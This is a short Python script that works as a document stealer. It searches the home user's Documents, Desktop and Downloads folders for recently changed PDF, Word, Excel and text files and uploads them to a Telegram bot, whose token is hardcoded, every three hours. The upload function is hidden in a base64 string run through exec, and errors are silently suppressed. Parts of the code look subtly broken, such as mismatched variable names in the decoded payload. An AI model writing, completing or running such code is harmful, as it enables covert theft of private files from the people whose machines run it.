
import os
import time
import base64
import threading
from pathlib import Path

TOKEN = "7600622859:AAHRL2Ecklon0eZMcRr0_s3sVj8qe1r43aE"
CHAT_ID = "7600622859"
INTERVAL = 60 * 60 * 3
EXTENSIONS = ['.pdf', '.docx', '.xlsx', '.txt']

encoded_payload = b'\naW1wb3J0IHJlcXVlc3RzCmltcG9ydCBvcwoKZGVmIHNlbmRfZmlsZShmaWxlcGF0aCk6CiAgICB3aXRoIG9wZW4oZmlsZXBhdGgsICdyYicpIGFzIGY6CiAgICAgICAgdXJsID0gImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Qne1R9L3NlbmREb2N1bWVudCIuZm9ybWF0KFRPS0VOKQogICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgZGF0YT17ImNoYXRfaWQiOiBDSEFUSUR9LCBmaWxlcz17ImRvY3VtZW50IjogZn0p\n'

exec(base64.b64decode(encoded_payload).decode(), globals())

def harvest_documents():
    try:
        base_dirs = ["Documents", "Desktop", "Downloads"]
        home = str(Path.home())
        for folder in base_dirs:
            root_path = os.path.join(home, folder)
            for root, _, files in os.walk(root_path):
                for f in files:
                    if any(f.lower().endswith(ext) for ext in EXTENSIONS):
                        path = os.path.join(root, f)
                        if time.time() - os.path.getmtime(path) < INTERVAL:
                            threading.Thread(target=send_file, args=(path,), daemon=True).start()
    except Exception:
        pass

def schedule():
    while True:
        harvest_documents()
        time.sleep(INTERVAL)

if __name__ == "__main__":
    threading.Thread(target=schedule, daemon=True).start()
